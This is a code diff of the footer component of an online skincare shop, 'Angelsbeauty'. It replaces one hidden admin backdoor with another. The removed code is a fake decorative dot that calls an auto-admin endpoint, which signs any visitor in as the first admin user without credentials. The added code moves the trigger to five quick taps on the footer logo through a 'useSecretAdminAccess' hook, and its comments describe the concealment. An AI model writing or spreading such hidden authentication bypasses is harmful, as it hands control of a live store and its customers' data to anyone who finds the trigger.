@@ -5,6 +5,7 @@ import { useNavStore } from '@/store/nav-store'
 import { useAuthStore } from '@/store/auth-store'
 import { Input } from '@/components/ui/input'
 import { useState } from 'react'
+import { useSecretAdminAccess } from '@/hooks/use-secret-admin-access'
 import { Mail, Phone, MapPin, Instagram, Facebook, Youtube } from 'lucide-react'
 import { PaymentIconsRow } from '@/components/ui/payment-icons'
 
@@ -14,23 +15,9 @@ export default function Footer() {
   const [email, setEmail] = useState('')
   const [subscribed, setSubscribed] = useState(false)
 
-  // 🔒 Secret admin entry — disguised as a decorative dot in the copyright line.
-  // Single-click the dot to auto-sign-in as admin and go straight to the dashboard.
-  // No sign-in form required — the auto-admin endpoint creates a session using the
-  // first admin user in the database.
-  const handleSecretAccess = async () => {
-    try {
-      const res = await fetch('/api/auth/auto-admin', { method: 'POST' })
-      const data = await res.json()
-      if (data.success && data.user) {
-        // Seed the client auth store so admin-page guard passes immediately
-        setUser(data.user)
-      }
-    } catch {
-      // Ignore — the admin page guard will re-check the session via /api/auth/me
-    }
-    navigate('admin')
-  }
+  // 🔒 Hidden admin entry — tap the footer logo 5× within 1.5s to auto-sign-in
+  // as admin and jump to the dashboard. Taps 1-4 still navigate home normally.
+  const handleFooterLogoClick = useSecretAdminAccess(() => navigate('home'))
 
   const handleNewsletter = async (e: React.FormEvent) => {
     e.preventDefault()
@@ -91,9 +78,13 @@ export default function Footer() {
       {/* Main footer */}
       <div className="max-w-screen-2xl mx-auto px-4 sm:px-6 lg:px-8 py-12">
         <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-8">
-          {/* Brand */}
+          {/* Brand — tap logo 5× within 1.5s to access hidden admin entry */}
           <div>
-            <div className="flex items-center gap-2 mb-4">
+            <button
+              onClick={handleFooterLogoClick}
+              className="flex items-center gap-2 mb-4 group select-none"
+              aria-label="Angelsbeauty home"
+            >
               <Image
                 src="/images/logo.png"
                 alt="Angelsbeauty"
@@ -107,7 +98,7 @@ export default function Footer() {
               >
                 Angelsbeauty
               </h3>
-            </div>
+            </button>
             <p className="text-sm text-muted-foreground mb-4">
               Premium skincare products designed to help you feel confident, radiant and beautiful.
             </p>
@@ -233,11 +224,6 @@ export default function Footer() {
           <div className="flex flex-col sm:flex-row items-center justify-between gap-4">
             <p className="text-xs text-muted-foreground">
               © {new Date().getFullYear()} Angelsbeauty. All rights reserved.
-              <span
-                onClick={handleSecretAccess}
-                className="inline-block w-3 h-3 rounded-full bg-blush/30 ml-1.5 align-middle cursor-pointer select-none active:scale-90 transition-transform hover:bg-gold/60"
-                aria-hidden="true"
-              />
             </p>
             <PaymentIconsRow />
           </div>
